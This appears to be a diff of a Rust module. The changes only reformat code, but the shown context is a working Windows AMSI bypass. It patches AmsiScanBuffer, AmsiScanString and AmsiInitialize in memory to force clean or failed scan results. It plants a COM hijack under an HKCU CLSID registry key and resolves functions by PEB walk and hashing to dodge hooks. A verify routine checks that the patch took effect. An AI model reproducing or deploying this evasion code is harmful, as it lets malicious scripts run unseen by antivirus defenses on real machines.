@@ -16,13 +16,15 @@ pub fn orchestrate_layers() -> bool {
 }
 
 #[cfg(not(windows))]
-pub fn orchestrate_layers() -> bool { true }
+pub fn orchestrate_layers() -> bool {
+    true
+}
 
 /// Patch AmsiScanBuffer in-process with `xor eax,eax; ret` to force AMSI_RESULT_CLEAN.
 #[cfg(windows)]
 fn apply_memory_patch() {
     use winapi::um::memoryapi::VirtualProtect;
-    use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ};
+    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
 
     unsafe {
         // Use pe_resolve (PEB walk + hash) to avoid IAT-hookable GetModuleHandleW.
@@ -40,7 +42,8 @@ fn apply_memory_patch() {
 
         // Resolve AmsiScanBuffer via hash
         let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
-        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_buf_hash) {
+        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_buf_hash)
+        {
             Some(addr) => addr as *mut winapi::ctypes::c_void,
             None => {
                 log::warn!("apply_memory_patch: AmsiScanBuffer not found");
@@ -70,7 +73,9 @@ fn apply_memory_patch() {
 
         // Also patch AmsiScanString
         let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
-        if let Some(scan_str_addr) = pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_str_hash) {
+        if let Some(scan_str_addr) =
+            pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_str_hash)
+        {
             let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
             let mut op: u32 = 0;
             if VirtualProtect(scan_str as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) != 0 {
@@ -86,7 +91,8 @@ fn apply_memory_patch() {
 fn apply_com_hijack() {
     use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
 
-    let subkey = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
+    let subkey =
+        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
     // Point to a nonexistent path so AMSI COM initialisation fails cleanly (2.11)
     let default_val = b"C:\\Windows\\System32\\amsi_disabled.dll\0";
 
@@ -124,7 +130,8 @@ pub fn cleanup_com_hijack() {
     use winapi::um::winreg::{RegDeleteKeyA, HKEY_CURRENT_USER};
     // Delete leaf key first; parent keys are harmless to leave (they are empty
     // standard Windows registry nodes).
-    let leaf = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
+    let leaf =
+        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
     let parent = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\0";
     unsafe {
         RegDeleteKeyA(HKEY_CURRENT_USER, leaf.as_ptr() as _);
@@ -156,10 +163,16 @@ fn set_init_failed_flag() {
 
         let patch: [u8; 6] = [
             0xB8, 0x05, 0x40, 0x00, 0x80, // mov eax, 0x80004005 (E_FAIL)
-            0xC3,                          // ret
+            0xC3, // ret
         ];
         let mut old: u32 = 0;
-        if VirtualProtect(init_fn as _, patch.len(), winapi::um::winnt::PAGE_EXECUTE_READWRITE, &mut old) != 0 {
+        if VirtualProtect(
+            init_fn as _,
+            patch.len(),
+            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
+            &mut old,
+        ) != 0
+        {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
             VirtualProtect(init_fn as _, patch.len(), old, &mut old);
             log::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
@@ -191,7 +204,11 @@ pub fn verify_bypass() -> bool {
         //   B8 00 00 00 00 + C3      (mov eax,0  ; ret) — 5 bytes shown here
         let patched = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
             || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
-            || (bytes[0] == 0xB8 && bytes[1] == 0x00 && bytes[2] == 0x00 && bytes[3] == 0x00 && bytes[4] == 0x00);
+            || (bytes[0] == 0xB8
+                && bytes[1] == 0x00
+                && bytes[2] == 0x00
+                && bytes[3] == 0x00
+                && bytes[4] == 0x00);
 
         if !patched {
             log::warn!("verify_bypass: AmsiScanBuffer does not appear patched (bytes: {:02x} {:02x} {:02x} {:02x} {:02x})",
@@ -202,5 +219,6 @@ pub fn verify_bypass() -> bool {
 }
 
 #[cfg(not(windows))]
-pub fn verify_bypass() -> bool { true }
-
+pub fn verify_bypass() -> bool {
+    true
+}
